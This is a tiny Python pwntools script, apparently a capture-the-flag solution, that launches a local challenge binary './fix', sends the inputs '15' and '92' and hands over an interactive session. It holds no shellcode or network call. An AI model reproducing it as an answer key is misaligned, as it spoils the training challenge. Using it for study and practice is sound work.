#!/usr/bin/python
from pwn import *

context.log_level = 'debug'

path = './fix'

p = process(path)

# p.recv()
p.sendline('15')
# p.recv()
p.sendline('92')

#  p.log("send values")

p.interactive()
